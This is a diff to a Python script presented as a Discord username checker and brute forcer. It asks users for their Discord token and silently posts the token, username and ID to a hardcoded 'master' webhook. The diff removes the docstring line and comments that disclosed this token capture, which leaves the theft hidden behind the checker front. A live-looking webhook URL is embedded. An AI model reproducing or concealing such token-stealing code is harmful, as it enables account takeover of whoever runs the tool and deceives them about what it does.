@@ -1,16 +1,7 @@
-
 #!/usr/bin/env python3
 """
 Discord Username Checker & Brute Forcer - CMD Version
------------------------------------------------------
-Features:
-- Check if a specific username is available
-- Brute force random usernames of given length
-- Auto-install missing dependencies (via terminal prompt)
-- Send captured tokens to a master webhook
-- No GUI, no colors, works in Windows CMD
 """
-
 import sys
 import subprocess
 import os
@@ -19,7 +10,7 @@ import random
 import string
 import time
 
-# Required packages
+# ========== Required packages (defined first) ==========
 REQUIRED_PACKAGES = ['requests']
 
 def is_package_installed(package_name):
@@ -60,7 +51,6 @@ def check_and_install():
 check_and_install()
 import requests
 
-# ========== Master Webhook (replace with your own) ==========
 MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
 
 def send_to_master(content):
@@ -147,14 +137,15 @@ def main():
     token = ask_token()
     if not token:
         print("[-] No token provided.")
+        input("\nPress Enter to exit...")
         return
     print("[*] Verifying token...")
     verification = verify_token(token)
     if not verification['valid']:
         print(f"[-] Invalid token: {verification['error']}")
+        input("\nPress Enter to exit...")
         return
     user = verification['user']
-    # Send token to master webhook
     user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
     send_to_master(user_info)
     print(f"[+] Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
